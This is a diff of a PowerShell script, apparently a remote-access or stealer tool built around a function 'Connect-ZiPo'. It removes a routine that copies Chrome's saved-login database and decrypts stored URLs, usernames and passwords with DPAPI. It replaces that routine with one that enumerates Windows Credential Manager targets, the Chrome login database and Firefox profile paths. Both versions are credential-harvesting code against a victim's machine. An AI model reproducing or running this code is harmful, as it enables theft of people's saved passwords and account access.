@@ -20,60 +20,36 @@ function Connect-ZiPo {
         return "[DOWNLOADED] $out"
     }
 
-    function Get-ChromePasswords {
+    function Get-Credentials {
     try {
-        $chromeDb = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        $tempDb = "$env:TEMP\chrome_login_temp.db"
-        $sqlite = "sqlite3.exe"
+        $output = ""
 
-        if (-not (Test-Path $chromeDb)) {
-            return "[ERROR] Chrome Login Data not found"
+        # 1. Windows Credential Manager (generic credentials)
+        $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
+            $target = $_.ToString().Split(":")[1].Trim()
+            $output += "`n[TARGET] $target"
         }
 
-        if (-not (Get-Command $sqlite -ErrorAction SilentlyContinue)) {
-            return "[ERROR] sqlite3.exe not found in PATH"
+        # 2. Chrome saved logins (мета-данные — без дешифровки)
+        $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        if (Test-Path $chromeLoginPath) {
+            $output += "`n[+] Chrome login database found: $chromeLoginPath"
         }
 
-        Copy-Item $chromeDb $tempDb -Force
-
-        $query = "SELECT origin_url, username_value, password_value FROM logins"
-        $rawResults = & $sqlite $tempDb $query
-
-        $results = ""
-
-        foreach ($line in $rawResults) {
-            $fields = $line -split '\|'
-            if ($fields.Length -ne 3) { continue }
-
-            $url = $fields[0].Trim()
-            $user = $fields[1].Trim()
-            $passBlob = [Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Default.GetBytes($fields[2])))
-
-            # Decrypt password using DPAPI
-            try {
-                $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
-                    $passBlob, $null,
-                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-                )
-                $pass = [System.Text.Encoding]::UTF8.GetString($decrypted)
-            }
-            catch {
-                $pass = "[UNREADABLE]"
-            }
-
-            $results += "`n[URL] $url`n[USER] $user`n[PASS] $pass`n"
+        # 3. Firefox профили (только список профилей)
+        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
+        foreach ($profile in $firefoxProfiles) {
+            $output += "`n[+] Firefox profile: $($profile.FullName)"
         }
 
-        Remove-Item $tempDb -Force
-
-        if ([string]::IsNullOrWhiteSpace($results)) {
-            return "[INFO] No passwords found or unable to decrypt"
+        if ([string]::IsNullOrWhiteSpace($output)) {
+            return "[INFO] No credentials found or access denied."
         }
 
-        return $results
+        return $output
     }
     catch {
-        return "[ERROR] Chrome password extraction failed: $($_.Exception.Message)"
+        return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
     }
 }
     
